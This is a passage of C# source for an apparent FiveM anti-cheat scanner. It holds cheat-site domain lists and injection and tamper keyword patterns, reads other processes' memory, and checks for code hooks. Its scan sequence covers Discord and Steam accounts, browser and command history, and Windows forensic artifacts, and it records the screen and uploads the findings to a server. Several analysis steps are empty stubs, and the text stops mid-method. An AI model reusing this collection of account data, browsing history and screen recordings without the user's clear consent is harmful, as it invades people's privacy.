using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Text;
using System.IO;
using Newtonsoft.Json;
using System.Management;
using Microsoft.Win32;

namespace FiveMScanner
{
    public class Scanner
    {
        public class HardwareInfo
        {
            public string Name { get; set; } = string.Empty;
            public HardwareDetails Details { get; set; } = null!;

            public HardwareInfo(string name, HardwareDetails details)
            {
                Name = name;
                Details = details;
            }
        }

        public class HardwareDetails
        {
            public string Type { get; set; } = string.Empty;
            public string Manufacturer { get; set; } = string.Empty;
            public string DeviceId { get; set; } = string.Empty;

            public HardwareDetails(string type, string manufacturer, string deviceId)
            {
                Type = type;
                Manufacturer = manufacturer;
                DeviceId = deviceId;
            }
        }

        private ApiClient _apiClient;
        private string _pin = string.Empty;
        private string _serverUrl = string.Empty;
        private List<object> _findings = new();
        private Dictionary<string, List<object>> _artifacts = new();
        private ScreenCapture _screenCapture = new();
        private Dictionary<string, List<DateTime>> _behaviorTimeline = new();
        private Dictionary<string, int> _suspicionScores = new();
        private List<object> _hardwareInfo = new();

        // New modular components
        private readonly BehaviorEngine _behaviorEngine;
        private readonly HybridScanner _hybridScanner;
        private readonly TelemetryClient _telemetryClient;
        private readonly Dictionary<string, DateTime?> _executionTimeCache = new();
        
        // Custom Rules
        private List<string> _customKeywords = new();
        private List<string> _customHashes = new();
        private Dictionary<string, string> _customKeywordSeverity = new();
        private Dictionary<string, string> _customHashSeverity = new();
        private string _customRulesTempFile = string.Empty;

        // Browser/site correlation helpers
        private sealed record CheatSitePattern(string Label, string Severity, string[] Domains);
        private sealed record HookEventEvidence(string Description, string Status, Dictionary<string, object> Details);
        
        private readonly List<CheatSitePattern> _cheatSitePatterns = new()
        {
            new CheatSitePattern("420 Cheats", "High", new[] { "420cheats.com", "420-services.net", "420services.net" }),
            new CheatSitePattern("Eulen", "High", new[] { "eulencheats.com", "eulen.shop" }),
            new CheatSitePattern("Midnight", "High", new[] { "midnight.im", "midnight.gg" }),
            new CheatSitePattern("Stand", "High", new[] { "stand.gg" }),
            new CheatSitePattern("Cherax", "High", new[] { "cherax.vip", "cherax.gg" }),
            new CheatSitePattern("Impulse", "High", new[] { "impulse.one", "impulsecheats.com" }),
            new CheatSitePattern("Phantom-X", "High", new[] { "phantom-x.com", "phantomx.gg" }),
            new CheatSitePattern("2Take1", "High", new[] { "2take1.menu" }),
            new CheatSitePattern("Paragon", "High", new[] { "paragonmenu.com" }),
            new CheatSitePattern("Disturbed", "High", new[] { "disturbedmenu.com" }),
            new CheatSitePattern("Ozark", "High", new[] { "ozarkmenu.com" }),
            new CheatSitePattern("Luna Menu", "High", new[] { "luna.gg", "lunacheats.com", "lunamenu.com" }),
            new CheatSitePattern("Kiddions", "High", new[] { "kiddions.com" }),
            new CheatSitePattern("Keyser", "High", new[] { "keyser.gg" }),
            new CheatSitePattern("HXCheats", "High", new[] { "hxcheats.com" }),
            new CheatSitePattern("TZProject", "High", new[] { "tzproject.com" }),
            new CheatSitePattern("RedEngine", "High", new[] { "redengine.net" }),
            new CheatSitePattern("Susano", "High", new[] { "susano.re" }),
            new CheatSitePattern("Skript", "High", new[] { "skript.gg" }),
            new CheatSitePattern("UnknownCheats Forum", "Medium", new[] { "unknowncheats.me" }),
            new CheatSitePattern("MPGH Forum", "Medium", new[] { "mpgh.net" }),
            new CheatSitePattern("ElitePVPers Forum", "Medium", new[] { "elitepvpers.com" }),
            new CheatSitePattern("CheatEngine", "Medium", new[] { "cheatengine.org" }),
            new CheatSitePattern("WeMod", "Medium", new[] { "wemod.com" }),
            new CheatSitePattern("Fling Trainer", "Medium", new[] { "flingtrainer.com", "fling-trainer.com" })
        };

        private readonly HashSet<string> _legitimateDomainKeywords = new(StringComparer.OrdinalIgnoreCase)
        {
            "google", "youtube", "gstatic", "ytimg", "facebook", "instagram", "twitter",
            "x.com", "tiktok", "discord", "cfx.re", "fivem.net", "github", "gitlab",
            "stackoverflow", "microsoft", "office", "live.com", "apple", "icloud",
            "amazon", "ebay", "paypal", "reddit", "wikipedia", "linkedin", "twitch",
            "netflix", "spotify", "skroutz", "bestbuy", "newegg", "steamcommunity",
            "steampowered", "epicgames", "riotgames"
        };

        private readonly string[] _trustedHookVendors =
        {
            "microsoft", "nvidia", "advanced micro devices", "amd", "intel",
            "logitech", "obs project", "elgato", "corsair", "razer", "asus", "msi"
        };

        private readonly string[] _trustedHookModules =
        {
            "dxgi.dll", "d3d11.dll", "rtsshooks64.dll", "rtsshooks32.dll",
            "nvwgf2umx.dll", "atidxx64.dll", "atidxx32.dll"
        };

        private readonly string[] _eventHookKeywords =
        {
            "code integrity", "hook", "injection", "dll injection",
            "remote thread", "virtualprotect", "tamper", "cheat engine"
        };

        private readonly System.Text.RegularExpressions.Regex _urlExtractionRegex =
            new System.Text.RegularExpressions.Regex(@"https?://[a-zA-Z0-9\-._~:/?#\[\]@!$&'()*+,;=%]+",
                System.Text.RegularExpressions.RegexOptions.Compiled);

        public Scanner(string serverUrl, string pin)
        {
            if (string.IsNullOrEmpty(serverUrl))
                throw new ArgumentNullException(nameof(serverUrl));
            if (string.IsNullOrEmpty(pin))
                throw new ArgumentNullException(nameof(pin));

            // ??? ANTI-DEBUG: Quick check before initialization (DISABLED FOR TESTING)
            // TODO: Re-enable for production builds
            /*
            Console.WriteLine("???  Performing security checks...");
            if (AntiDebug.QuickCheck())
            {
                Console.WriteLine("?? SECURITY ALERT: Debugging tools detected!");
                Console.WriteLine("?? The scanner cannot run while debugging/analysis tools are active.");
                Console.WriteLine("?? Please close all debugging tools and try again.");
                throw new InvalidOperationException("Debugging tools detected. Please close all debugging/analysis tools and try again.");
            }

            // ??? ANTI-DEBUG: Start continuous monitoring
            AntiDebug.StartMonitoring();
            */

            _serverUrl = serverUrl;
            _pin = pin;
            _apiClient = new ApiClient(serverUrl, pin);
            _findings = new List<object>();
            _artifacts = new Dictionary<string, List<object>>();
            _screenCapture = new ScreenCapture();
            _behaviorTimeline = new Dictionary<string, List<DateTime>>();
            _suspicionScores = new Dictionary<string, int>();
            _hardwareInfo = new List<object>();
            _behaviorEngine = new BehaviorEngine();
            _hybridScanner = new HybridScanner();
            _telemetryClient = new TelemetryClient(serverUrl);

            InitializeHardwareScanning();
        }

        private async Task DownloadCustomRules()
        {
            try
            {
                var json = await _apiClient.DownloadCustomRules();
                
                if (string.IsNullOrEmpty(json))
                {
                    Console.WriteLine("??  No custom rules configured for this user");
                    return;
                }
                
                var rules = JsonConvert.DeserializeObject<dynamic>(json);
                
                // Load keywords
                if (rules.keywords != null)
                {
                    foreach (var kw in rules.keywords)
                    {
                        string keyword = kw.keyword?.ToString() ?? "";
                        string severity = kw.severity?.ToString() ?? "Medium";
                        if (!string.IsNullOrEmpty(keyword))
                        {
                            _customKeywords.Add(keyword.ToLower());
                            _customKeywordSeverity[keyword.ToLower()] = severity;
                        }
                    }
                    Console.WriteLine($"? Loaded {_customKeywords.Count} custom keywords");
                }
                
                // Load hashes
                if (rules.hashes != null)
                {
                    foreach (var hash in rules.hashes)
                    {
                        string hashValue = hash.hash?.ToString() ?? "";
                        string severity = hash.severity?.ToString() ?? "High";
                        if (!string.IsNullOrEmpty(hashValue))
                        {
                            _customHashes.Add(hashValue.ToUpper());
                            _customHashSeverity[hashValue.ToUpper()] = severity;
                        }
                    }
                    Console.WriteLine($"? Loaded {_customHashes.Count} custom file hashes");
                }
                
                // Save YARA rules to temp files for scanning
                if (rules.yara_rules != null && rules.yara_rules.Count > 0)
                {
                    var tempPath = Path.GetTempPath();
                    var yaraFolder = Path.Combine(tempPath, "FiveMScanner_CustomYARA");
                    
                    // Create temp folder for YARA rules
                    if (!Directory.Exists(yaraFolder))
                    {
                        Directory.CreateDirectory(yaraFolder);
                    }
                    
                    // Clear old rules
                    foreach (var oldFile in Directory.GetFiles(yaraFolder, "*.yar"))
                    {
                        try { File.Delete(oldFile); } catch { }
                    }
                    
                    int savedCount = 0;
                    foreach (var yaraRule in rules.yara_rules)
                    {
                        try
                        {
                            string ruleName = yaraRule.name?.ToString() ?? $"custom_rule_{savedCount}";
                            string ruleContent = yaraRule.content?.ToString() ?? "";
                            
                            if (!string.IsNullOrEmpty(ruleContent))
                            {
                                // Sanitize filename
                                var safeFileName = string.Join("_", ruleName.Split(Path.GetInvalidFileNameChars()));
                                var yaraFilePath = Path.Combine(yaraFolder, $"{safeFileName}.yar");
                                
                                // Write YARA rule to file
                                File.WriteAllText(yaraFilePath, ruleContent);
                                savedCount++;
                                
                                Console.WriteLine($"?? Saved YARA rule: {ruleName}");
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"??  Could not save YARA rule: {ex.Message}");
                        }
                    }
                    
                    Console.WriteLine($"? Loaded {savedCount} custom YARA rules to {yaraFolder}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Could not download custom rules: {ex.Message}");
            }
        }

        private void InitializeHardwareScanning()
        {
            try
            {
                var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_PnPEntity");
                foreach (ManagementObject device in searcher.Get())
                {
                    try
                    {
                        string name = device.GetPropertyValue("Name")?.ToString() ?? "Unknown";
                        string pnpClass = device.GetPropertyValue("PNPClass")?.ToString() ?? "Unknown";
                        string manufacturer = device.GetPropertyValue("Manufacturer")?.ToString() ?? "Unknown";
                        string deviceId = device.GetPropertyValue("DeviceID")?.ToString() ?? "Unknown";

                        _hardwareInfo.Add(new 
                        {
                            name = name,
                            details = new
                            {
                                type = pnpClass,
                                manufacturer = manufacturer,
                                device_id = deviceId
                            }
                        });
                    }
                    catch { }
                }

                _artifacts["HARDWARE_AND_PERIPHERALS"] = _hardwareInfo;
                Console.WriteLine($"? Collected {_hardwareInfo.Count} hardware devices");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error scanning hardware: {ex.Message}");
            }
        }

        private readonly List<string> _trustedPublishers = new List<string>
        {
            "Microsoft Corporation", "NVIDIA Corporation", "Advanced Micro Devices, Inc.", "Intel Corporation",
            "Google Inc.", "Mozilla Corporation", "Valve Corporation", "Rockstar Games", "Discord Inc.",
            "Logitech", "Razer Inc.", "Corsair", "SteelSeries", "Oracle Corporation",
            "The Document Foundation", "VideoLAN", "OBS Project", "Python Software Foundation",
            "JetBrains s.r.o.", "Git-SCM Contributors", "Heroku, Inc.", "Amazon.com, Inc.",
            "Citrix Systems, Inc.", "TeamViewer GmbH", "Realtek Semiconductor Corp.", "ASUSTeK COMPUTER INC.",
            "GIGA-BYTE TECHNOLOGY CO., LTD.", "Micro-Star INT'L CO., LTD.", "Dell Inc.", "HP Inc.",
            "Lenovo", "IBM", "Apple Inc."
        };

        // P/Invoke declarations for memory scanning
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        [StructLayout(LayoutKind.Sequential)]
        private struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public IntPtr RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_VM_READ = 0x0010;

        // Lightweight stubs for newly-referenced analysis steps.
        // These can be expanded into full implementations (entropy analysis, injection detection, temporal correlation, behavior analysis).
        private async System.Threading.Tasks.Task AnalyzeFileEntropy()
        {
            await System.Threading.Tasks.Task.CompletedTask;
        }

        private async System.Threading.Tasks.Task DetectProcessInjection()
        {
            await System.Threading.Tasks.Task.CompletedTask;
        }

        private async System.Threading.Tasks.Task PerformTemporalCorrelation()
        {
            await System.Threading.Tasks.Task.CompletedTask;
        }

        private async System.Threading.Tasks.Task AnalyzeBehavioralPatterns()
        {
            await System.Threading.Tasks.Task.CompletedTask;
        }

        public async Task PerformFullScan()
        {
            Console.WriteLine("?? Starting system analysis...");
            Console.WriteLine();

            // Start screen recording (30 seconds)
            Console.WriteLine("?? Starting screen recording...");
            var recordingTask = Task.Run(() => _screenCapture.StartRecording(30));

            // Try to fetch latest rulepacks from server (non-blocking)
            try
            {
                var rpJson = await _telemetryClient.FetchRulePacksAsync(_serverUrl);
                if (!string.IsNullOrWhiteSpace(rpJson))
                {
                    // Save to temp folder instead of scanner directory
                    var rpPath = Path.Combine(Path.GetTempPath(), "rulepacks.json");
                    File.WriteAllText(rpPath, rpJson);
                    Console.WriteLine($"?? Fetched rulepacks and saved to temp: {rpPath}");
                }
            }
            catch { }

            // Download custom rules from server
            Console.WriteLine("?? Downloading custom detection rules...");
            await DownloadCustomRules();

            // Scan with custom rules
            Console.WriteLine("?? Scanning with custom rules...");
            await ScanDirectoriesWithCustomRules();

            // Collect system information with validation
            Console.WriteLine("?? Collecting system information...");
            await CollectSystemInfo();
            await Task.Delay(1000); // Allow time for system info collection

            // Scan for Discord/Steam tokens with validation and delay
            Console.WriteLine("?? Scanning for user accounts (Discord, Steam)...");
            await ScanUserAccounts();
            await Task.Delay(1000); // Allow time for thorough account scanning

            // Scan for cheats with validation and delay
            Console.WriteLine("?? Scanning for cheat files...");
            await ScanForCheats();
            await Task.Delay(1000); // Allow time for thorough cheat scanning

            // NEW: Entropy Analysis for Packed Files
            Console.WriteLine("?? Analyzing file entropy (packed/obfuscated detection)...");
            await AnalyzeFileEntropy();

            // Scan Journal (USN)
            Console.WriteLine("?? Scanning Journal (USN) entries...");
            await ScanJournal();

            // Scan MFT
            Console.WriteLine("?? Scanning MFT (Master File Table)...");
            await ScanMFT();

            // Scan processes
            Console.WriteLine("??  Scanning running processes...");
            await ScanProcesses();

            // Scan network connections
            Console.WriteLine("?? Scanning network connections...");
            await ScanNetwork();

            // Scan hardware & peripherals
            Console.WriteLine("?? Scanning hardware & peripherals...");
            await ScanHardware();

            // Scan process memory
            Console.WriteLine("?? Scanning process memory...");
            await ScanProcessMemory();

            // Check for memory hooks
            Console.WriteLine("?? Checking for memory hooks...");
            await CheckMemoryHooks();

            // NEW: Real-time Process Injection Detection
            Console.WriteLine("?? Detecting process injection attempts...");
            await DetectProcessInjection();

            // Check critical services
            Console.WriteLine("??  Checking critical services...");
            await CheckCriticalServices();

            // Scan browser history
            Console.WriteLine("?? Scanning browser history...");
            await ScanBrowserHistory();

            // Scan command history
            Console.WriteLine("?? Scanning command history...");
            await ScanCommandHistory();

            // Scan game files (FiveM, GTA V)
            Console.WriteLine("?? Scanning game files...");
            await ScanGameFiles();

            // NEW: Prefetch Analysis
            Console.WriteLine("? Analyzing Prefetch files...");
            await ScanPrefetchFiles();

            // NEW: Registry Forensics
            Console.WriteLine("?? Performing registry forensics...");
            await ScanRegistryForensics();

            // NEW: ShimCache Analysis
            Console.WriteLine("?? Analyzing ShimCache...");
            await ScanShimCache();

            // NEW: Bypass Methods Detection
            Console.WriteLine("? Detectming bypass methods...");
            await DetectBypassMethods();

            // NEW: Temporal Analysis & Correlation
            Console.WriteLine("?? Performing temporal correlation analysis...");
            await PerformTemporalCorrelation();

            // NEW: Behavioral Pattern Analysis
            Console.WriteLine("?? Analyzing behavioral patterns...");
            await AnalyzeBehavioralPatterns();

            // NEW: Unbacked Executable Memory Detection  
            Console.WriteLine("?? Scanning for unbacked executable memory (Hidden Injections)...");
            await ScanForUnbackedExecutableMemory();

            // NEW: Forensics - LNK Files & ShellBags
            Console.WriteLine("?? Scanning Recent Files (LNK Forensics)...");
            await ScanLnkFiles();
            
            Console.WriteLine("?? Scanning ShellBags (Directory Access History)...");
            await ScanShellBags();

            // Submit results
            Console.WriteLine();
            Console.WriteLine("?? Submitting results to server...");
            Console.WriteLine($"Total findings to submit: {_findings.Count}");
            try
            {
                await SubmitResults();
            }
            catch (Exception ex)
            {
                Console.WriteLine($"? CRITICAL: Failed to submit results: {ex.Message}");
                Console.WriteLine($"Exception type: {ex.GetType().Name}");
                Console.WriteLine($"Stack trace: {ex.StackTrace}");
                if (ex.InnerException != null)
                {
                    Console.WriteLine($"Inner exception: {ex.InnerException.Message}");
                }
                // Don't rethrow - we want the scan to complete even if submission fails
            }

            // Wait for recording to finish with timeout
            try
            {
                var recordingTimeout = Task.Delay(TimeSpan.FromSeconds(35)); // 30s recording + 5s buffer
                var completedTask = await Task.WhenAny(recordingTask, recordingTimeout);
                
                if (completedTask == recordingTask)
                {
                    await recordingTask; // Ensure any exceptions are observed
                    Console.WriteLine("? Screen recording completed");
                }
                else
                {
                    Console.WriteLine("??  Screen recording timed out, continuing...");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Screen recording completed with warnings: {ex.Message}");
            }
            
            // ??? ANTI-DEBUG: Stop monitoring after scan completes (DISABLED FOR TESTING)
            // AntiDebug.StopMonitoring();
            
            // Cleanup: Delete temporary files
            try
            {
                // Delete rulepacks.json from temp folder
                var rpPath = Path.Combine(Path.GetTempPath(), "rulepacks.json");
                if (File.Exists(rpPath))
                {
                    File.Delete(rpPath);
                    Console.WriteLine("???  Cleaned up temporary rulepacks file");
                }
                
                // Delete custom YARA rules folder
                var yaraFolder = Path.Combine(Path.GetTempPath(), "FiveMScanner_CustomYARA");
                if (Directory.Exists(yaraFolder))
                {
                    Directory.Delete(yaraFolder, true);
                    Console.WriteLine("???  Cleaned up temporary YARA rules folder");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Failed to cleanup temporary files: {ex.Message}");
            }
            
            Console.WriteLine("? Scan completed successfully!");
        }

        private async Task ScanProcessMemory()
        {
            var memoryFindings = new List<object>();
            var targetProcesses = new List<System.Diagnostics.Process>();

            try
            {
                // Find FiveM and suspicious processes (FAST - limit to 3 processes max)
                var allProcesses = System.Diagnostics.Process.GetProcesses();
                foreach (var proc in allProcesses)
                {
                    try
                    {
                        var procName = proc.ProcessName.ToLower();
                        
                        // Priority: FiveM processes
                        if (procName.Contains("fivem") || procName.Contains("gta"))
                        {
                            targetProcesses.Add(proc);
                            if (targetProcesses.Count >= 3) break; // FAST: Only 3 processes max
                        }

                        // Check for suspicious keywords (only first 5)
                        foreach (var keyword in CheatDatabase.SuspiciousKeywords.Take(5))
                        {
                            if (procName.Contains(keyword.ToLower()))
                            {
                                targetProcesses.Add(proc);
                                break;
                            }
                        }

                        if (targetProcesses.Count >= 3) break; // FAST: Limit to 3 processes
                    }
                    catch { }
                }

                // Scan each target process memory (FAST - only 2 processes)
                foreach (var proc in targetProcesses.Take(2))
                {
                    try
                    {
                        var foundStrings = ScanProcessMemoryForStrings(proc.Id);
                        
                        foreach (var str in foundStrings.Take(5)) // FAST: Only first 5 strings
                        {
                            memoryFindings.Add(new
                            {
                                description = $"Found suspicious string `{str}` in memory",
                                details = $"Process: {proc.ProcessName} (PID: {proc.Id})",
                                status = "critical"
                            });

                            // Get last execution time
                            var procPath = proc.MainModule?.FileName ?? "Unknown";
                            var instanceStatus = procPath != "Unknown" ? GetExecutionInstanceStatus(procPath) : "Out of instance";
                            
                            // Add as finding
                            _findings.Add(new
                            {
                                category = "Memory Scan",
                                name = $"Suspicious Memory String: {str}",
                                severity = "High",
                                path = procPath,
                                action = "Detected in memory",
                                source_type = "Memory Scan",
                                last_execution_time = instanceStatus
                            });
                        }
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error scanning memory: {ex.Message}");
            }

            if (memoryFindings.Count > 0)
            {
                _artifacts["MEMORY_SCAN"] = memoryFindings;
            }

            Console.WriteLine($"? Scanned {targetProcesses.Count} processes, found {memoryFindings.Count} suspicious strings");
        }

        private List<string> ScanProcessMemoryForStrings(int pid)
        {
            var foundStrings = new List<string>();
            var processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);

            if (processHandle == IntPtr.Zero)
                return foundStrings;

            try
            {
                var mbi = new MEMORY_BASIC_INFORMATION();
                var baseAddress = IntPtr.Zero;
                var regionsScanned = 0;
                var maxRegions = 20; // FAST: Reduced from 50 to 20
                var maxRegionSize = 512 * 1024; // FAST: 512KB max per region (reduced from 1MB)
                var startTime = DateTime.Now;
                var timeout = TimeSpan.FromSeconds(5); // FAST: 5 second timeout (reduced from 10)

                // Build search patterns from CheatDatabase
                var searchPatterns = CheatDatabase.DPSSuspiciousStrings.Take(30).ToList();

                while (VirtualQueryEx(processHandle, baseAddress, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0 &&
                       regionsScanned < maxRegions &&
                       DateTime.Now - startTime < timeout)
                {
                    // Check if memory is committed and readable (not PAGE_NOACCESS or PAGE_GUARD)
                    if ((mbi.State & 0x1000) != 0 && (mbi.Protect & 0x101) == 0)
                    {
                        var scanSize = (int)Math.Min(mbi.RegionSize.ToInt64(), maxRegionSize);

                        try
                        {
                            var buffer = new byte[scanSize];
                            
                            if (ReadProcessMemory(processHandle, mbi.BaseAddress, buffer, scanSize, out int bytesRead) && bytesRead > 0)
                            {
                                // Extract strings from memory (ASCII/UTF-8)
                                var memoryStrings = ExtractStringsFromMemory(buffer, bytesRead);

                                // Check for suspicious patterns
                                foreach (var pattern in searchPatterns)
                                {
                                    if (memoryStrings.Any(s => s.IndexOf(pattern, StringComparison.OrdinalIgnoreCase) >= 0))
                                    {
                                        foundStrings.Add(pattern);
                                        
                                        if (foundStrings.Count >= 10) // Limit matches
                                            goto done;
                                    }
                                }
                            }
                        }
                        catch { }

                        regionsScanned++;
                    }

                    // Move to next region
                    baseAddress = new IntPtr(baseAddress.ToInt64() + mbi.RegionSize.ToInt64());
                }

                done:;
            }
            finally
            {
                CloseHandle(processHandle);
            }

            return foundStrings.Distinct().ToList();
        }

        // Helper method to check if byte array contains a specific byte pattern
        private bool ContainsBytePattern(byte[] data, byte[] pattern)
        {
            if (pattern == null || pattern.Length == 0 || data == null || data.Length < pattern.Length)
                return false;

            for (int i = 0; i <= data.Length - pattern.Length; i++)
            {
                bool match = true;
                for (int j = 0; j < pattern.Length; j++)
                {
                    if (data[i + j] != pattern[j])
                    {
                        match = false;
                        break;
                    }
                }
                if (match) return true;
            }
            return false;
        }

        private List<string> ExtractStringsFromMemory(byte[] buffer, int length)
        {
            var strings = new List<string>();
            var currentString = new List<byte>();
            var minStringLength = 4; // Minimum string length to consider

            for (int i = 0; i < length; i++)
            {
                byte b = buffer[i];

                // Check if byte is printable ASCII (32-126) or common extended ASCII
                if ((b >= 32 && b <= 126) || b == 9 || b == 10 || b == 13)
                {
                    currentString.Add(b);
                }
                else
                {
                    // End of string
                    if (currentString.Count >= minStringLength)
                    {
                        try
                        {
                            var str = Encoding.ASCII.GetString(currentString.ToArray());
                            if (!string.IsNullOrWhiteSpace(str))
                            {
                                strings.Add(str.Trim());
                            }
                        }
                        catch { }
                    }
                    currentString.Clear();
                }

                // Limit extracted strings for performance
                if (strings.Count >= 1000)
                    break;
            }

            // Check last string
            if (currentString.Count >= minStringLength)
            {
                try
                {
                    var str = Encoding.ASCII.GetString(currentString.ToArray());
                    if (!string.IsNullOrWhiteSpace(str))
                    {
                        strings.Add(str.Trim());
                    }
                }
                catch { }
            }

            return strings;
        }

        private async Task ScanFileMetadata(string filePath, List<object> metadataFindings)
        {
            try
            {
                var extension = Path.GetExtension(filePath).ToLower();
                if (extension != ".exe" && extension != ".dll")
                {
                    return;
                }

                var versionInfo = FileVersionInfo.GetVersionInfo(filePath);
                var companyName = versionInfo.CompanyName;

                if (string.IsNullOrWhiteSpace(companyName) || !_trustedPublishers.Any(p => companyName.Contains(p, StringComparison.OrdinalIgnoreCase)))
                {
                    var finding = new
                    {
                        description = "Suspicious or missing file publisher.",
                        details = new
                        {
                            file = filePath,
                            company = companyName ?? "N/A",
                            product = versionInfo.ProductName ?? "N/A",
                            description = versionInfo.FileDescription ?? "N/A"
                        },
                        status = string.IsNullOrWhiteSpace(companyName) ? "warning" : "info"
                    };
                    metadataFindings.Add(finding);

                    // Get last execution time
                    var instanceStatus = GetExecutionInstanceStatus(filePath);
                    
                    _findings.Add(new
                    {
                        category = "File Metadata",
                        name = $"Untrusted Publisher: {companyName ?? "N/A"}",
                        severity = "Medium",
                        path = filePath,
                        action = "Detected",
                        source_type = "Metadata",
                        last_execution_time = instanceStatus
                    });
                }
            }
            catch (Exception ex)
            {
                // Ignore files we can't access
            }
        }

        private IntPtr? GetRemoteFunctionAddress(ProcessModule remoteModule, string moduleName, string functionName)
        {
            try
            {
                var localModule = GetModuleHandle(moduleName);
                if (localModule == IntPtr.Zero) return null;

                var localFunc = GetProcAddress(localModule, functionName);
                if (localFunc == IntPtr.Zero) return null;

                long offset = localFunc.ToInt64() - localModule.ToInt64();
                if (offset < 0 || offset > remoteModule.ModuleMemorySize) return null;

                return AddOffset(remoteModule.BaseAddress, offset);
            }
            catch
            {
                return null;
            }
        }

        private static IntPtr AddOffset(IntPtr baseAddress, long offset)
        {
            if (IntPtr.Size == 8)
            {
                return new IntPtr(baseAddress.ToInt64() + offset);
            }

            return new IntPtr(baseAddress.ToInt32() + (int)offset);
        }

        private bool TryComputeHookTarget(IntPtr processHandle, byte[] buffer, IntPtr instructionAddress, out long targetAddress, out string signature)
        {
            signature = string.Empty;
            targetAddress = 0;

            if (buffer == null || buffer.Length < 5) return false;

            // JMP rel32 or CALL rel32
            if (buffer[0] == 0xE9 || buffer[0] == 0xE8)
            {
                var displacement = BitConverter.ToInt32(buffer, 1);
                var baseAddr = instructionAddress.ToInt64();
                targetAddress = baseAddr + 5 + displacement;
                signature = buffer[0] == 0xE9 ? "JMP rel32" : "CALL rel32";
                return true;
            }

            // JMP [RIP+imm32]
            if (buffer[0] == 0xFF && buffer[1] == 0x25)
            {
                var displacement = BitConverter.ToInt32(buffer, 2);
                var pointerLocation = instructionAddress.ToInt64() + 6 + displacement;
                var pointerBuffer = new byte[IntPtr.Size];
                try
                {
                    if (ReadProcessMemory(processHandle, new IntPtr(pointerLocation), pointerBuffer, pointerBuffer.Length, out int pointerBytesRead) && pointerBytesRead == pointerBuffer.Length)
                    {
                        targetAddress = IntPtr.Size == 8 ? BitConverter.ToInt64(pointerBuffer, 0) : BitConverter.ToInt32(pointerBuffer, 0);
                        signature = "JMP [RIP+imm32]";
                        return true;
                    }
                }
                catch { }
            }

            return false;
        }

        private (string Name, string Path, string Company)? ResolveModuleInfo(IEnumerable<ProcessModule> modules, IntPtr address)
        {
            try
            {
                var target = address.ToInt64();
                foreach (ProcessModule module in modules)
                {
                    var start = module.BaseAddress.ToInt64();
                    var end = start + module.ModuleMemorySize;
                    if (target >= start && target < end)
                    {
                        var company = string.Empty;
                        try { company = module.FileVersionInfo?.CompanyName ?? string.Empty; } catch { }
                        return (module.ModuleName ?? "Unknown", module.FileName ?? "Unknown", company);
                    }
                }
            }
            catch { }

            return null;
        }

        private bool IsTrustedHookTarget(string moduleName, string company)
        {
            if (!string.IsNullOrWhiteSpace(moduleName))
            {
                if (_trustedHookModules.Any(trusted => moduleName.IndexOf(trusted, StringComparison.OrdinalIgnoreCase) >= 0))
                    return true;
            }

            if (!string.IsNullOrWhiteSpace(company))
            {
                var normalized = company.ToLowerInvariant();
                if (_trustedHookVendors.Any(vendor => normalized.Contains(vendor)))
                    return true;
            }

            return false;
        }

        private List<HookEventEvidence> AnalyzeHookRelatedEventLogs(IEnumerable<string> processNames, TimeSpan lookback)
        {
            var evidence = new List<HookEventEvidence>();
            var processFilters = (processNames ?? Array.Empty<string>())
                .Where(p => !string.IsNullOrWhiteSpace(p))
                .Select(p => p.ToLowerInvariant())
                .Distinct()
                .ToList();

            var logsToCheck = new[] { "System", "Application", "Security" };

            foreach (var log in logsToCheck)
            {
                try
                {
                    var query = new System.Diagnostics.Eventing.Reader.EventLogQuery(log, System.Diagnostics.Eventing.Reader.PathType.LogName);
                    using var reader = new System.Diagnostics.Eventing.Reader.EventLogReader(query);

                    System.Diagnostics.Eventing.Reader.EventRecord record;
                    int inspected = 0;
                    var cutoff = DateTime.Now - lookback;

                    while (inspected < 400 && (record = reader.ReadEvent()) != null)
                    {
                        inspected++;
                        if (!record.TimeCreated.HasValue || record.TimeCreated.Value < cutoff) continue;

                        string description = string.Empty;
                        try { description = record.FormatDescription() ?? string.Empty; } catch { }

                        var combined = $"{record.ProviderName} {record.TaskDisplayName} {description}".ToLowerInvariant();
                        if (!_eventHookKeywords.Any(keyword => combined.Contains(keyword))) continue;

                        if (processFilters.Count > 0 && !processFilters.Any(filter => combined.Contains(filter)))
                            continue;

                        evidence.Add(new HookEventEvidence(
                            $"Event log indicates potential tampering ({log})",
                            "warning",
                            new Dictionary<string, object>
                            {
                                { "log", log },
                                { "provider", record.ProviderName ?? string.Empty },
                                { "event_id", record.Id },
                                { "level", record.LevelDisplayName ?? string.Empty },
                                { "created", record.TimeCreated?.ToString("o") ?? string.Empty },
                                { "message", (description ?? string.Empty).Trim() }
                            }));
                    }
                }
                catch { }
            }

            return evidence;
        }

        private async Task CheckMemoryHooks()
        {
            var hookFindings = new List<object>();
            var processNames = new List<string>();

            try
            {
                var targetProcesses = System.Diagnostics.Process.GetProcesses()
